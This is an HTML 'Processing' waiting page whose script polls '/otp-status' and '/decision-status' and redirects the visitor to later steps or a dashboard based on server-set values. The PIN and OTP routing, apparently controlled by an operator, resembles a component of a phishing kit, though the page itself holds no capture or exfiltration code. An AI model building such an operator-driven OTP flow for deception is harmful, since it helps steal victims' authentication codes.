<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>
const fromPin = localStorage.getItem("fromPin");
const firstProcess = localStorage.getItem("firstProcess");

// ===== FLOW B (PRIORITY) =====
if (fromPin === "yes") {

  console.log("FLOW B ACTIVE");

  const interval = setInterval(async () => {
    try {
        const res = await fetch("/otp-status");
        const data = await res.json();

        console.log("OTP STATUS:", data);

        if (String(data.otp) === "5") {
            clearInterval(interval);
            localStorage.removeItem("fromPin");
            window.location.href = "step5.html";
        }

        if (String(data.otp) === "6") {
            clearInterval(interval);
            localStorage.removeItem("fromPin");
            window.location.href = "step6.html";
        }

        const decisionRes = await fetch("/decision-status");
        const decisionData = await decisionRes.json();

        if (decisionData.decision === "accept") {
            clearInterval(interval);
            window.location.href = "dashboard.html";
        }

        if (decisionData.decision === "decline") {
            clearInterval(interval);
            localStorage.clear();
            window.location.href = "step5.html";
        }

    } catch (err) {
        console.log("Waiting...");
    }
  }, 2000);

}

// ===== FLOW A =====
else if (firstProcess === "yes") {

    console.log("FLOW A ACTIVE");

    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}
</script>

</body>
</html>
